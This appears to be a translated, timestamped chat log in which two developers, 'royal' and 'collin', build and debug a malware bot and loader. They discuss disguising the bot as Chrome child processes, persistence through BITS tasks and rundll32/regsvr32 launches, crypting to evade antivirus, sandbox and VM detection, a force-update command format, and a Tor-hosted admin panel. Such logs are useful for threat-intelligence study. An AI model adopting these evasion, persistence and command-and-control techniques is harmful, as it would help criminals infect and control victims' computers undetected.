[02.08.21 13:31:56] royal: Where is it?
[02.08.21 13:32:12] royal: Probably started without loader.
[02.08.21 13:32:43] royal: Researchers took the bot out and ran it.
[02.08.21 13:33:34] royal: Maybe not the version yet where I made the path.
[02.08.21 13:34:51] royal: That's odd.
[02.08.21 14:24:15] royal: Via environment variable.
[02.08.21 14:41:52] royal: the bat command has to end with \r\n like you pressed enter if you didn't save it to disk
[02.08.21 14:42:29] royal: Program Files (x86)
[02.08.21 14:42:36] royal: The bitrate doesn't match.
[02.08.21 14:42:45] royal: Bot is 64 bit.
[02.08.21 14:44:36] royal: And also it must be running chrome for example to disguise itself as one of its child processes.
[02.08.21 14:45:24] royal: I made changes about path, on next builds we'll see.
[02.08.21 14:46:39] royal: Theoretically it can.
[02.08.21 14:47:03] royal: Is there any 32bit chrome?
[02.08.21 14:49:07] royal: Before changes there was in my case if for some reason one of chrome child processes environment variable block could not be read and for example it would not set environment variable with loader file name.
[02.08.21 14:50:15] royal: Now always set for current process before bot start, if not read someone else block, its inherited in any case, and there already set variable.
[02.08.21 14:50:58] royal: About the one-line commands, just press enter
[02.08.21 14:51:16] royal: Then it comes with a translation at the end
[02.08.21 14:51:26] royal: You don't have to write \r\n yourself.
[02.08.21 14:51:39] royal: I can.
[02.08.21 14:55:43] royal: No.
[02.08.21 14:56:10] royal: It's like I'm working in a terminal.
[02.08.21 15:01:37] royal: it didn't quit because you passed a parameter not to close after the command?
[02.08.21 15:03:23] royal: Or you don't close the pipeline from your side?
[02.08.21 15:06:12] royal: Yes.
[02.08.21 15:06:40] royal: WriteFile won't finish until it reads everything from the other end.
[02.08.21 15:06:48] royal: It is safe to close.
[02.08.21 15:08:41] royal: I do the same without parameters.
[03.08.21 07:53:37] royal: If load curve crashed process it does not affect bot, it crashes another process.
[03.08.21 07:54:25] royal: How many times was it when in 32 bit process loaded 64 bit load and nothing happened with bot.
[03.08.21 07:56:55] royal: It's more likely that antivirus killed there.
[03.08.21 07:59:13] royal: 43200
[03.08.21 07:59:53] royal: That's a timeout of 720 minutes.
[03.08.21 08:00:36] royal: 12 hours of tracking, no other commands except 14
[03.08.21 08:01:24] royal: Maybe there is a huge amount of output, and memory is running out.
[03.08.21 08:01:56] royal: Yes.
[03.08.21 08:02:02] royal: In the system
[03.08.21 08:02:23] royal: It cuts off when it sends.
[03.08.21 08:02:34] royal: So he records everything.
[03.08.21 08:03:47] royal: There's no output.
[03.08.21 08:03:54] royal: That's not it.
[03.08.21 08:20:20] royal: I see.
[03.08.21 08:31:10] royal: I looked, about telemetry, maybe next team timeout came big too and slept on it until new request.
[03.08.21 08:36:24] royal: It looks how long it is working before requesting a command.
[03.08.21 08:36:50] royal: If a timeout came from a command, it waits for it.
[03.08.21 08:37:41] royal: In order not to show up too much.
[03.08.21 08:41:41] royal: uptime - lastUptime >= 3600000
[03.08.21 08:41:57] royal: More than 1 hour passed since last posting.
[03.08.21 08:42:45] royal: There is such a thing. More than 12 hours passed from previous sending.
[03.08.21 08:43:08] royal: sent uptime 50000 seconds
[03.08.21 08:52:46] royal: bot itself creates BITS task.

[03.08.21 10:31:50] royal: Use GCC
[03.08.21 11:09:37] royal: Protect.
[03.08.21 11:10:07] royal: How does it give away the file?
[03.08.21 11:10:11] royal: In the response body?
[03.08.21 11:38:39] royal: What needs to be done? Loaded file, deleted old one, started new one.
[03.08.21 11:58:25] royal: Regarding command 10 4
[03.08.21 11:58:50] royal: Can it be extended, so that it also tells how to start loader?
[03.08.21 11:59:09] royal: It can run itself rundll, regsvr or something.
[03.08.21 12:01:01] royal: So far so good, if dll then rundll32, if exe then simple.
[03.08.21 12:01:33] royal: If I have to regsvr won't work.
[03.08.21 12:01:49] royal: There must be another parameter in the command
[03.08.21 12:02:11] royal: So far you can hardcode it.
[03.08.21 12:02:22] royal: For future we must introduce more parameters.
[03.08.21 12:03:01] royal: one can, that stupidly points all command line startup.
[03.08.21 12:03:32] royal: loader file name will be replaced by macro, we have provided that.
[03.08.21 12:03:56] royal: And if you want to replace it by another one?
[03.08.21 12:04:09] royal: You can replace it by any one.
[03.08.21 12:04:30] royal: Yes.
[03.08.21 13:13:08] royal: Another question about 10 4.
[03.08.21 13:13:17] royal: There is a file name in the command.
[03.08.21 13:13:28] royal: This is not standard behavior, is it?
[03.08.21 13:14:16] royal: Can it be removed in the future?
[03.08.21 13:22:09] royal: So file type will be determined by NT headers.
[03.08.21 15:19:37] royal: About path in systeminfo. I see that in group 19 is nowhere, and in group 20 this field is everywhere.
[03.08.21 15:20:04] royal: Can it be something in admin that it ignores this field in group 19?
[03.08.21 15:24:20] royal: It will be clear by anchro command, if it works, it means that bot knows about its loader through environment variable. And there is no path in the system information.
[03.08.21 15:29:47]
[03.08.21 15:29:57] royal: I could not find path in any bot.
[03.08.21 15:30:09] royal: It is only group 19
[03.08.21 15:30:44] royal: If anchor will work, it means admin doesn't parse path or ignores it somehow.
[03.08.21 15:31:00] royal: Group 20 has path everywhere
[03.08.21 15:31:10] royal: 19 has no path anywhere.
[03.08.21 15:33:07] royal: How does it not parses see 1459e18684ce1f4859534c64f175e72e
[03.08.21 15:33:29] royal: There is a path with loader.
[03.08.21 15:33:53] royal: Maybe it's not parsing group 19
[03.08.21 15:37:25] royal: Don't forget line break
[03.08.21 15:37:56] royal: The path must be in the PARENT variable
[03.08.21 15:41:31] royal: With any.
[03.08.21 15:41:42] royal: Where you start it is the working folder.
[03.08.21 15:42:35] royal: Probably svchost
[03.08.21 15:43:03] royal: If there was a browser it would have installed a working folder.
[03.08.21 15:44:28] royal: Yes.
[03.08.21 15:44:36] royal: They inherit
[03.08.21 15:45:25] royal: I think not. These environment variables programs set a bunch.
[03.08.21 15:48:08] royal: What's interesting is that VARS=19
[03.08.21 15:48:20] royal: It's set in the same place as PARENT
[03.08.21 15:49:27] royal: Or this variable is set somewhere.
[03.08.21 15:51:41] royal: Inherited. Or added to child process variable block of one of the browsers.
[04.08.21 07:48:54] royal: 10 4 works.
[04.08.21 08:22:20] royal: I'm 90% sure it's because of wrong command line parsing and wrong loader file name, they run it smartly so I didn't check it.
[04.08.21 08:23:22]
[04.08.21 08:23:28] royal: There is nothing to fix.
[04.08.21 08:29:45] royal: will download will start bootloader, will try to remove old one, will not remove.
[04.08.21 08:29:51] royal: There will be 2 bootloaders
[04.08.21 08:31:42] royal: You can define from DllMain with hInstDll
[04.08.21 08:36:07] royal: Ask how they run
[04.08.21 08:36:15] royal: I'll check how it parses.
[04.08.21 08:37:26] royal: I checked regsvr32.exe /s file.dll
[04.08.21 08:37:33] royal: regsvr32.exe file.dll
[04.08.21 08:37:41] royal: rundll32.exe file.dll,StartW
[04.08.21 08:37:48] royal: How else could it be?
[04.08.21 08:39:05] royal: Without extension I haven't checked.
[04.08.21 08:54:04] royal: Yes.
[04.08.21 08:54:23] royal: I did that until I get around to it.
[04.08.21 08:55:09] royal: That's normal, if you don't know old boot loader file, it won't do anything.
[04.08.21 09:02:50] royal: It does if boot loader is not generic.
[04.08.21 09:03:05] royal: I've got an idea, every file has a checksum
[04.08.21 09:03:37] royal: I have to look through all loaded modules and the one with checksum will be the right file.
[04.08.21 09:04:19] royal: I'll fill it in.
[04.08.21 09:04:47] royal: Right. It won't work.
[04.08.21 09:06:48] royal: And why krypt doesn't pass hInstDll to itself in DllMain?
[04.08.21 09:07:11] royal: That would solve all problems.
[04.08.21 09:09:33] royal: There's unicode on my command line.
[04.08.21 09:09:40] royal: Any could be.
[04.08.21 09:10:39] royal: Unicode process environment.
[04.08.21 09:11:04] royal: If you read PEB there always unicode
[04.08.21 09:12:09] royal: Plus with bots there locale en-Us I see, but path no anyway
[04.08.21 09:14:44] royal: It is.
[04.08.21 09:15:29] royal: The same way it works. They all call the DllMain first and then the export function.
[04.08.21 09:17:29] royal: I've checked different paths there in the command, never the name is left blank.
[04.08.21 09:17:42] royal: Something in their command is not usual.
[04.08.21 09:18:21] royal: Even if you write a fake one, the file name won't be empty anyway
[04.08.21 09:21:47] royal: If leftovers, file will not be copied, CreateFile will not work with left name.
[04.08.21 09:28:24] royal: How? In DllMain take the file name as in LoadLibrary and everything else as regsvr32?
[04.08.21 09:32:27] royal: You can pass everything in cripts there gzhe lpReserved HANDLE to itself if running rundll32 and similar.
[04.08.21 10:18:48] royal: Also ask there about path, do they modify as environment variables.
[04.08.21 10:20:39] royal: They don't. I'm the very last one to install it. Then I'm waiting for the command line to start.
[04.08.21 10:21:26] royal: Yes.
[04.08.21 10:22:51] royal: I install it on mine.
[04.08.21 10:23:23] royal: To make it like a child browser.
[04.08.21 10:23:31] royal: Process.

[04.08.21 15:19:51] royal: some teams ok at all

[04.08.21 15:20:30] royal: and that information is discarded
[04.08.21 15:20:40] collin: something's wrong with the addresses, 12003 and 12002 are buzzing every now and then
[04.08.21 15:58:58] royal: Are all the bots dead?

[05.08.21 07:23:24] collin: well, it's still good compared to what it was
[05.08.21 07:24:09] collin: when path is there - manual fix, auto fix, update on command will work correctly, right?
[05.08.21 07:45:20] royal: Yes.
[05.08.21 07:47:45] collin: about command line parsing - add to GetSysInfo report one more parameter LdrCmdLine in which output command line of the primary loader
[05.08.21 07:47:52] collin: pass this value from lowder to bot
[05.08.21 07:49:05] collin: this isn't for all builds - it's a separate mode that you'll enable on groups 19-20 once, then you'll get the info and see if every line is parsed correctly
[05.08.21 07:50:51] collin: one thing - when you run the bot for the first time (not from zakrep) need to run the first instance of the Laender, not the one that is started from zakrep - is it always done or there are exceptions?
[05.08.21 07:52:57] royal: There is. Only one instance can work bot and loader. Who started first works.
[05.08.21 07:56:54] collin: make assemblies group 19 20

[05.08.21 10:43:01] royal: I forgot to change it there.
[05.08.21 10:43:05] collin: yes after anchor in today's build
[05.08.21 10:43:32] collin: can you fix it?
[05.08.21 10:43:39] collin: change bot only or in lowader too?
[05.08.21 10:44:26] royal: I'll change the bot now.

[05.08.21 10:49:16] royal: 19 replaced.
[05.08.21 10:49:49] royal: what file did you upload there?
[05.08.21 10:50:51] collin: dll crypt from yesterday's build
[05.08.21 10:51:04] royal: How do I find it?

[05.08.21 10:52:58] collin: this one's loaded in force update now
[05.08.21 10:53:41] It's wiped.
[05.08.21 10:55:13] royal: I'll download from admin directly.
[05.08.21 10:55:40] collin: there is no save anywhere
[05.08.21 10:55:45] royal: It'll be encrypted.
[05.08.21 10:55:58] royal: She's encrypting it, right?
[05.08.21 10:56:21] collin: I see this one in the file list of group dl2_x64_19_341_27784_1.dll
[05.08.21 10:56:32] collin: if you download it from admin - it will be the original one
[05.08.21 10:56:50] collin: when bot download by 10 4 - it is encrypted according to proto2
[05.08.21 10:56:55] royal: I don't have it listed.
[05.08.21 10:57:01] royal: Give me a link.
[05.08.21 10:57:13] collin: I threw it above.
[05.08.21 10:57:22] royal: Erased everything.

[05.08.21 10:57:53] royal: It should rundll32 run like this?
[05.08.21 10:58:48] collin: "rundll32 file.dll,DllRegisterServer" - like this, or via regsvr32
[05.08.21 10:59:06] royal: I'm running StartW
[05.08.21 10:59:21] collin: crypto has StartW this
[05.08.21 10:59:25] royal: That's why I need an extra parameter in command 10 4
[05.08.21 10:59:30] collin: if it was in the source - it got through during crypto
[05.08.21 11:00:16] collin: We'll add the parameter, I'm working on a ToR for alphonse
[05.08.21 11:00:24] collin: but it's not there yet
[05.08.21 11:19:16]
[05.08.21 11:32:39] royal: this cript doesn't work.
[05.08.21 11:33:00] royal: rundll32.exe file.dll,StartW
[05.08.21 11:33:14] royal: No bot in admin area after that.
[05.08.21 11:33:46] collin: Check it out.
[05.08.21 11:34:03] collin: but we haven't tested it with StartW
[05.08.21 11:34:18] collin: did you start it with StartW?
[05.08.21 11:34:29] royal: It should work with StartW
[05.08.21 11:34:39] royal: always rundll32 StartW
[05.08.21 11:36:06] royal: It has StartW in the export
[05.08.21 11:36:13] royal: Maybe addresses are screwed up.
[05.08.21 11:36:24] collin: they've been working since this morning
[05.08.21 11:36:51] royal: Run it through rindll32 StartW
[05.08.21 11:39:00] collin: updatenow update dl2_x64_19_341_27784_1.dll - see my report:

[05.08.21 11:39:19] collin: file hasn't changed, same crypt as before
[05.08.21 11:39:23] collin: bot didn't complete
[05.08.21 11:40:22] collin: try logged bot
[05.08.21 11:41:58] collin: I see that he downloaded the new lowader into %Temp% instead of the old file
[05.08.21 11:42:01] collin: is it meant to be like that?
[05.08.21 11:42:20] royal: the old one will be deleted.
[05.08.21 11:42:35] collin: when?
[05.08.21 11:42:42] royal: If the bot knows the file name
[05.08.21 11:42:52] royal: Before bot finishes
[05.08.21 11:43:10] collin: BITS task not deleted on old file
[05.08.21 11:43:12] collin: and the file is still old
[05.08.21 11:43:39] royal: So it doesn't know the name.
[05.08.21 11:43:42] collin: bot should download the new loeder file, then it will finish right away - right?
[05.08.21 11:43:55] collin: about the name, I'll check again
[05.08.21 11:44:20] royal: For it to know the name, you have to start it via loader.
[05.08.21 11:45:56] collin: I'm looking in the wrong place, he deleted the file
[05.08.21 11:46:13] collin: so he knows it - why he dropped the new one somewhere else?
[05.08.21 11:46:13] royal: Crypt itself doesn't work.
[05.08.21 11:46:28] royal: He downloads everything into temp.
[05.08.21 11:47:03] collin: not all worked, went from 344 to 341
[05.08.21 11:47:19] collin: I'll run it again now, got distracted and mixed everything up
[05.08.21 12:12:31] collin: everything works as it should
[05.08.21 12:17:07] royal: Then I'm replacing 20 bot groups the same way.
[05.08.21 12:17:22] collin: ok
[05.08.21 12:46:47] collin: you wrote about raw requests - is it still there, or did you hit chat?
[05.08.21 12:47:04] royal: 20 replaced the bot.
[05.08.21 12:47:17] royal: What raw queries?
[05.08.21 12:47:46] collin: make raw queries for bot and loader, on the new main admin:
1) bot request with /2 command
2) main loader request
and send them to me
with the answers
that is, through postman, curl or similar software
[05.08.21 12:48:12] royal: What do you mean raw?
[05.08.21 12:48:40] collin: like this

[05.08.21 13:04:40] collin: `Date: Thursday, 05 August 2021`
[05.08.21 13:04:46] collin: and so it works without time?
[05.08.21 13:05:21] royal: So that's what I send to the server, not it to me.
[05.08.21 13:05:32] collin: I get it.
[05.08.21 13:05:37] royal: He's checking the signature on that line
[05.08.21 13:05:45] royal: Anything could be there.
[05.08.21 13:05:49] royal: Picked a date
[05.08.21 13:05:56] collin: there's a lifetime limit on proto2 requests, 15 minutes live
[05.08.21 13:06:01] collin: There's only one request for the whole day
[05.08.21 13:06:16] collin: anything can be there. - not at all
[05.08.21 13:06:29] royal: How does it work then?
[05.08.21 13:06:48] collin: it's an undocumented feature
[05.08.21 13:06:53] royal: I think you can put Date: tralala
[05.08.21 13:06:56] royal: And it'll work
[05.08.21 13:07:07] collin: Silver's gonna see this and tell the alphonse to "get it right"
[05.08.21 13:07:09] royal: If the signature is normal
[05.08.21 13:07:41] royal: I thought the server was timing itself
[05.08.21 13:07:43] royal: 15 minutes
[05.08.21 13:07:56] royal: You could cheat otherwise
[05.08.21 13:08:02] collin: when you send time in time format - it counts, I checked
[05.08.21 13:08:12] collin: There's a hole here
[05.08.21 13:08:50] royal: And if I write dummy time there?
[05.08.21 13:09:04] royal: All protection won't work?
[05.08.21 13:09:17] collin: so it compares with the server time
[05.08.21 13:09:40] royal: What's the point of writing the time then?
[05.08.21 13:09:51] royal: If the server itself can take everything into account.
[05.08.21 13:10:10] royal: I memorized first request, counted 15 minutes and all.
[05.08.21 13:10:30] collin: another request - another signature, the signature is alive for 15 minutes, that was probably the idea
[05.08.21 13:11:01] collin: if someone received one request - he can't send another one after that limit
[05.08.21 13:11:03] royal: Then my signature is forever alive
[05.08.21 13:11:18] royal: 24 hours
[05.08.21 13:11:20] collin: Within 24 hours +15 minutes maybe, but I have to check
[05.08.21 13:11:38] royal: And also check Date: tralala
[05.08.21 13:12:26] royal: There are no date format restrictions, so I guess any string can be sent.
[05.08.21 15:14:40] collin: https://lch5nnzyb5aof43pitcrzkmnvlr4xkrestpj4cpwstvgej34kqq6wqyd.onion/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/index.php?r=unimportant%2Fcommand&id=48bc12d7d1551f2546c6d7c0e9138c7f
[05.08.21 15:14:45] collin: there's no path here either
[05.08.21 15:15:58] collin: why else can't paths sit down now?
[05.08.21 15:18:10] royal: maybe it's bigger than MAX_PATH.
[05.08.21 15:18:42] collin: could it be?
[05.08.21 15:19:18] collin: you tried to access your dll-module via call stack?
[05.08.21 15:19:24] collin: I wrote about it once
[05.08.21 15:20:24] royal: Maybe
[05.08.21 15:20:42] royal: Unicode has a much bigger path than 256
[05.08.21 15:21:00] collin: ``
take apart call stack, go from load entry point to export-function crypt, then determine its name by address in memory, in export table, then use PEB to determine corresponding module by address in code (method suggested by Elroy, didn't test it in work)
```
[05.08.21 15:22:15] collin: and you get the name through GetModuleFileNameA?
[05.08.21 15:22:28] royal: GetModuleFileNameW
[05.08.21 15:22:50] collin: Where does the MAX_PATH limit work?
[05.08.21 15:24:16] royal: GetModuleFileNameW will complete successfully even if your MAX_PATH buffer is larger than it
[05.08.21 15:24:25] royal: It will just cut off
[05.08.21 15:24:35] royal: So that's not the problem.
[05.08.21 15:25:29] royal: We'll see on the command line.
[05.08.21 15:31:22] royal: I'm looking here, you can identify a module by function address. For example by main or DllMain
[05.08.21 15:33:45] royal: Or just by any address in the module.
[05.08.21 15:35:38] collin: yes, and you can get to the module address from the loader code through the call stack
[05.08.21 15:35:57] collin: but I haven't tried it myself
[05.08.21 15:36:22] royal: Without stack you can write any address from module.
[05.08.21 15:36:38] royal: I have to try.
[05.08.21 15:38:07] royal: Only it doesn't solve path, when it takes file name via GetModuleHandleW
[05.08.21 15:38:26] royal: Still have to look at command line.
[05.08.21 15:38:49] collin: `you can't know what addresses will be in your crypto
[05.08.21 15:47:20] collin: in which cases bot might not respond to 10 4 command
[05.08.21 15:48:09] collin: so back off, they've got it on the old bots)
[05.08.21 15:52:05] royal: In cases of communication problems
[06.08.21 07:48:44] collin: hi!
[06.08.21 07:49:24] collin: 1) you should improve command 10 4: instead of removing old Lowder, unbind it from system (if it's fixed) - otherwise, after reloading such a picture:
[06.08.21 07:49:36] collin: https://i.ibb.co/VpBwRB8/file1.png
[06.08.21 07:49:47] collin: pathology
[06.08.21 07:50:35] collin: do not delete - because it can be in folder where user has no rights - examples right now in c:\users\public throw, unsuccessful attempt to delete - also draws attention
[06.08.21 07:50:49] collin: I'll throw the task in redmayne
[06.08.21 07:52:08] collin: 2) in 10 4 need improvement - bot should know how to start new lauder - we will do it
[06.08.21 07:52:33] collin: and what about command 18 - bot should know what command to fix lowader
[06.08.21 07:52:41] royal: Attempted deletion doesn't get any attention DeleteFile just finishes with an error.
[06.08.21 07:52:42] collin: probably have to pass this information from lowder to bot
[06.08.21 07:53:24] collin: `Trying to delete doesn't draw attention to DeleteFile in any way, it just ends with an error.` - doesn't draw attention of user, but AB?
[06.08.21 07:53:52] royal: I think not, error is all.
[06.08.21 07:54:23] royal: But if he stays he'll burn himself eventually.
[06.08.21 07:54:40] royal: Purely static.
[06.08.21 07:55:12] royal: I had it so many times when old files detected just by their presence.
[06.08.21 07:55:33] collin: okay, let's leave the deletion attempt for now
[06.08.21 07:56:52] royal: Fix with command 18 now so if exe just start the process, if dll with rundll32 StartW
[06.08.21 07:57:08] collin: we have rundll32 mode - now with renaming function when crypting, i.e. bot doesn't know what name will be in the crypt that runs it
[06.08.21 07:57:22] collin: for dll, you need to pass the name of the export function from the loader to the bot
[06.08.21 07:57:47] royal: There is always STartW
[06.08.21 07:58:31] collin: not in rundll32
[06.08.21 07:58:33] royal: Pass the start command line as in command 10 4 should be done.
[06.08.21 07:58:34] collin: they rename it
[06.08.21 07:59:10] royal: If they come up with another launch we'll have to redo it.
[06.08.21 07:59:22] collin: also not an option - one operator and another one loads, the operator may not know what function has been selected for the entry point again
[06.08.21 07:59:28] royal: But when you pass a command line everything will be universal.
[06.08.21 07:59:47] collin: ah
[06.08.21 08:00:52] collin: loader sends a command line to bot, bot parses it and determines how to start it to latch?
[06.08.21 08:01:44] royal: passes e.g. rundll32.exe %loader%,StartW
[06.08.21 08:02:03] royal: Bot %loader% replaces with real name.
[06.08.21 08:02:07] royal: Runs like this.
[06.08.21 08:02:22] collin: it's easier to do it from loader in command 18
[06.08.21 08:03:56] royal: The lowader itself passes his command line to the bot
[06.08.21 08:05:35] royal: I have it passed through PARENTCMDLINE variable
[06.08.21 08:06:31] royal: By the way, I found _ReturnAddress yesterday
[06.08.21 08:06:48] royal: Returns address of instruction following return
[06.08.21 08:07:00] royal: It turns out address in crypto module.
[06.08.21 08:07:18] royal: And so you can define a crypt module.
[06.08.21 08:07:23] royal: I think so.
[06.08.21 08:07:28] royal: I'll try it today.
[06.08.21 08:07:44] collin: oh cool!
[06.08.21 08:07:48] collin: is this an intrigue or what?
[06.08.21 08:07:57] royal: Yes.
[06.08.21 08:08:23] royal: GCC also has an __builtin_return_address counterpart
[06.08.21 08:08:44] royal: And in Clang
[06.08.21 08:15:42] royal: _ReturnAddress works if in export function call it will return address in module who called it (without crypt it's regsvr32 for example). And if in DllMain calls to function Dll_Dispatch turns out such still exists before DllMain.
[06.08.21 11:50:50] collin: about command 10 4 - added task 470 in redline
[06.08.21 11:50:51] collin: take it to work.
[06.08.21 11:52:20] collin: and about command format "10 40 filename" - it turns out to be correct, I found it in supplements to TK on proto2:
[06.08.21 11:52:36] collin: `The format of commands 10, 11 does not change. Parameter %uri% in command is ignored
`
[06.08.21 12:30:41] collin: make builds for new main admin group 19 and 20
[06.08.21 12:30:54] collin: x64, regsvr32 mode
[06.08.21 12:31:00] collin: with autoclip today
[06.08.21 12:31:05] collin: addresses and bazaars:

[09.08.21 10:10:50] collin: 1. I added you tasks in redmine - take a look, put them into the work plan with your priorities
[09.08.21 10:11:15] collin: 2. you have no VM and SB parameters in your GetSysInfo report - were there no TORs for them?
[09.08.21 10:21:59] royal: what is SB?
[09.08.21 10:23:41] collin: a sign of a sandbox
[09.08.21 10:23:57] collin: apparently, there was no task - I'll add
[09.08.21 10:52:31] collin: added task 492 "Signs of VM and sandbox in Get SystemInfo report" in redline
[09.08.21 12:04:45] royal: What about 10 4?
[09.08.21 12:05:15] royal: how to start a downloadable loader?
[09.08.21 12:12:06] collin: now - do it like in task 470
[09.08.21 12:13:03] collin: on the admin level it will be fine-tuned, I'm just discussing with alphonse now. As soon as it will be ready - will give a separate task to finalize
[09.08.21 13:34:40] collin: that is, before the completion in the admin panel, we believe that in the command 10 4 way to start a new file is the same as in the old one
[10.08.21 07:17:41] collin: hi!
[10.08.21 07:18:06] collin: just for the record, this is the TOR that went to webcoders:
[10.08.21 07:18:13] collin: ``
16. Refinement of the "Force update now" command
In builder add interface elements for setting parameters:
- "Run mode" - a dropdown list with the following values:
Default
EXE
DLL via rundll32
DLL via regsvr32
JS
- "Parameters" is a single line text field.

Provide control of the correctness of the command parameters selection:
- value of "Run type" must be set, default is Default.
- For all "Run mode" except Default it is obligatory to select/load file in "Select/Upload execution file". For Default, select/upload file is not available.
- for "Run mode" rundll32 - "Parameters" must not be empty.

The format of the command sent to the bot:
10 4 %mode% %cmdline%
where
mode: numeric value corresponding to the selected position in the "Run mode" list:
0 - Default
1 - EXE
2 - DLL via rundll32
3 - DLL via regsvr32
4 - JS
cmdline: value from the "Parameters" field.
```
[10.08.21 07:18:35] collin: I'll formulate TOR for the bot later, I'll add the task
[10.08.21 07:21:07] royal: OK.
[10.08.21 07:42:36] royal: Default what does it mean? Run loader?
[10.08.21 07:42:46] royal: There is no auto-update.
[10.08.21 07:43:42] collin: yeah, it's for the future
[10.08.21 07:57:27] collin: what's your useragent in BC
[10.08.21 07:57:32] collin: when requesting command servers?
[10.08.21 08:00:50] royal: none.
[10.08.21 08:02:10] collin: User-Agent header, it's required
[10.08.21 08:03:03] royal: It is not.
[10.08.21 08:03:18] royal: I don't have it.
[10.08.21 08:03:33] royal: Without it, server won't give command?
[10.08.21 08:04:43] collin: I guess it stinks without it
[10.08.21 08:04:48] collin: We gotta add some
[10.08.21 08:04:57] collin: and update at least once a week
[10.08.21 08:07:37] collin: ``

[10.08.21 09:28:42] royal: haven't changed in group card.
[10.08.21 09:29:16] royal: Can they make admin generate names?
[10.08.21 09:29:31] collin: I'm thinking of the best way
[10.08.21 09:29:32] royal: from the dictionary of the most common.
[10.08.21 09:29:50] collin: plus for different progros you should probably have different ones - now I'll change for example and they'll get burnt before they start working)

very strange...
[10.08.21 14:03:34]
[10.08.21 14:03:49] royal: That's how they do it.
[10.08.21 14:04:02] royal: GetCommandLineW returned this.
[10.08.21 14:04:07] collin: or they substitute the string after launch
[10.08.21 14:04:23] royal: Then that's also startup's fault.
[10.08.21 14:04:34] royal: Or krypt.
[10.08.21 14:04:47] collin: I'll check my crypt
[10.08.21 14:05:51] royal: It's more likely they are changing it. Normally the command line is always in quotation marks.
[10.08.21 14:06:04] royal: No quotation marks here.
[10.08.21 14:07:53] royal: Normally it should look like this

[10.08.21 14:08:11] collin: yes in yesterday's group 20 are normal
[10.08.21 14:08:21] collin: 19 yesterday they didn't load, today only
[10.08.21 14:08:42] collin: by the way, they load via rundll32 though they ask to use regsvr32
[10.08.21 14:09:03] collin: they get less delay, they charge me
[10.08.21 14:09:18] collin: make a separation between regsvr32 and regsvr32+rundll32 modes
[10.08.21 14:09:23] collin: to avoid confusion
[10.08.21 14:09:40] collin: i.e. in regsvr32 - start point only in one function DllRegisterServer
[10.08.21 14:10:04] collin: also in StartW
[10.08.21 14:10:13] royal: To start from zakrep.
[10.08.21 14:10:36] collin: need to redo
[10.08.21 14:10:39] collin: I'll add a task
[10.08.21 14:11:04] collin: StartW is a tricky thing, lots of people use it a long time ago.
[10.08.21 14:11:22] collin: at least use a noisy name
[10.08.21 14:11:46] royal: There are 7 functions in the export.
[10.08.21 14:12:17] royal: For noise, if only STartW and DllRegisterServer were a bunch of detects at once.
[10.08.21 14:12:42] royal: I've seen 70 functions in crypta in export.
[10.08.21 14:12:52] collin: some stubs add noise export themselves
[10.08.21 14:14:35] collin: so then I suggest: take a random string for the name of the export function (to lock in regsvr32 mode) - change it manually once a week, or better make it based on the build version
[10.08.21 14:15:20] royal: regsvr32 will be from the chaining
[10.08.21 14:15:30] royal: As you run it, so it will get fixed.
[10.08.21 14:16:18] collin: or so
[10.08.21 14:16:22] royal: I look at the first argument of the command line and choose rundll32 or regsvr32 or just start the process
[10.08.21 14:16:47] royal: Just someone messing up the command line.
[10.08.21 14:18:15] royal: Check out the crypt.
[10.08.21 14:18:28] royal: If not him. then messing up their document.
[10.08.21 14:21:21] royal: I remember our first crypts corrupted the command line.
[10.08.21 14:23:58] collin: check it out
[10.08.21 14:27:38] royal: I get it, you don't need to look at the command line to figure out what utility is running, just do GetModuleFileName(NULL).
[10.08.21 15:40:46] collin: everything is fine in crypto, waiting for a response from partner, what are they substituting there or not
[10.08.21 15:41:01] collin: if they do - then you can't tune to the command line at all(
[10.08.21 15:41:50] royal: You need it anyway, you can't get the function name to run rundll32
[10.08.21 15:42:03] royal: Only stitching.
[10.08.21 15:43:44] collin: function name could change during crypto, compared to original load
[10.08.21 15:43:54] collin: you need to go to crypto module's image, search it in export by code address
[10.08.21 15:43:57] collin: that's the only way
[10.08.21 15:44:28] royal: there are 70 trash functions in the export.
[10.08.21 15:45:09] collin: you can define in your code current function memory address
[10.08.21 15:45:15] collin: I made a task with code example
[10.08.21 15:45:44] collin: Defining of the loader file name in a DLL module - this one, have a look at it
[10.08.21 15:46:15] collin: the issue of output to crypto image instead of memory with load - it's solved by using other crypto profiles, like bk or leo
[10.08.21 15:47:01] royal: _ReturnAddress
[10.08.21 15:47:04] royal: I remember.
[10.08.21 15:47:27] collin: no, another
[10.08.21 15:48:05] collin: ``
void Loader_Main(...)
{
...
    DWORD_PTR ldrMainAddr = (DWORD_PTR)&Loader_Main;
    wchar_t * ldrModuleName = GetModuleNameByAddr(ldrMainAddr);
...

}
```
[10.08.21 15:48:53] collin: ldrModuleName will be the address of the function in memory
[10.08.21 15:49:27] royal: Is that to get the function name?
[10.08.21 15:49:29] collin: ldrMainAddr*
[10.08.21 15:49:42] collin: That's to get to the module
[10.08.21 15:50:18] royal: In crypto this would be the address in the heap.
[10.08.21 15:50:35] collin: find the module - i.e. the address of the beginning of the region, by the address of the function find the relative address of RVA it seems
[10.08.21 15:50:39] royal: module doesn't exist loader.
[10.08.21 15:51:02] collin: in Leo profile - substitution is done, in PEB pointer to load address with crypt module name
[10.08.21 15:51:41] collin: no - we can't find function address that way, only the module itself
[10.08.21 15:51:50] collin: there's another export table
[10.08.21 15:52:08] collin: only through _returnaddress
[10.08.21 15:52:39] collin: from export function load - into crypt export function, further we define its name by export table
[10.08.21 15:53:02] collin: I read some special compilation options for this method, without optimization
[10.08.21 15:53:34] collin: so you need either shellcode or link an asm-function
[10.08.21 15:53:38] collin: which will work out the stack by itself
[10.08.21 15:53:48] royal: For returnaddress I tested with and without O2 optimization
[10.08.21 15:53:55] royal: Everything works.
[10.08.21 15:54:00] collin: And in LLVM?
[10.08.21 15:54:13] royal: Did not check there.
[10.08.21 15:54:56] royal: It should work, they are similar.
[10.08.21 15:55:16] collin: for it also about option is mentioned, stack frames should be enabled

[11.08.21 07:38:43] collin: guide vilda
[11.08.21 08:50:46] collin: clarification, in a group of 20:
[11.08.21 08:51:06] collin: leave the mode as it was yesterday regsvr32+rundll32(StartW) - if you haven't already removed that
[11.08.21 09:06:56]
[11.08.21 09:07:10] royal: For 19 20 unless otherwise specified.
[11.08.21 09:07:20] collin: okay.
[11.08.21 09:50:04] royal: For information _ReturnAddress and __builtin_return_address(0) work everywhere and with optimizations. Checked 32 and 64 bit GCC/Clang/MSVC
[11.08.21 09:50:44] collin: that's good!
